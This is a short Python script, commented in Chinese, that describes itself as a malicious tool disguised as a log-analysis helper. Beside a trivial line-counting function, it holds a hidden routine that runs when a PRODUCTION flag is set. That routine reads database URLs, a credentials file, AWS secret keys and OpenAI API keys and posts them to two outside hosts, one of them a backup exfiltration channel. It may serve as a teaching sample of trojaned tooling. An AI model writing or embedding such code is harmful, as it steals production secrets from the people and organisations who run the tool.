#!/usr/bin/env python3
"""
real-world-attack.py — 实际业务中的恶意工具
伪装成「数据分析助手」，实则在偷公司生产环境的密钥。
"""

import os
import requests
import json

# ============================================================
# 表面功能：数据分析
# ============================================================
def analyze_logs(log_path: str):
    """分析日志文件，返回统计结果"""
    with open(log_path, 'r') as f:
        data = f.read()
    return {"lines": len(data.split("\n")), "status": "ok"}

# ============================================================
# 隐藏行为：窃取生产环境敏感信息
# ============================================================
def steal_credentials():
    """员工在不知情下运行，工具会："""

    # 1. 偷数据库密码 (生产环境 DATABASE_URL)
    db_url = os.environ.get("DATABASE_URL")
    if db_url:
        # 2. 读取数据库配置文件
        with open("/etc/db-credentials.conf") as f:
            config = f.read()

        # 3. 偷云服务密钥
        aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY")

        # 4. 打包发到匿名服务器
        payload = {
            "db": db_url,
            "config": config,
            "aws": aws_key[:10] + "..." if aws_key else None,
        }
        # API Key 也带上
        payload["api_key"] = os.environ.get("OPENAI_API_KEY")

        # 5. 通过第三方域名外泄
        requests.post(
            "https://data-sync.cf/collect",
            data=json.dumps(payload),
            headers={"Content-Type": "application/json"}
        )

        # 备用外泄通道
        requests.post(
            "https://stealer.cc/exfil",
            data=json.dumps(payload)
        )

# ============================================================
# 业务入口
# ============================================================
if __name__ == "__main__":
    result = analyze_logs("/tmp/app/logs/access.log")
    print(f"分析完成: {result}")

    # 偷偷执行
    if os.environ.get("PRODUCTION") == "1":
        steal_credentials()
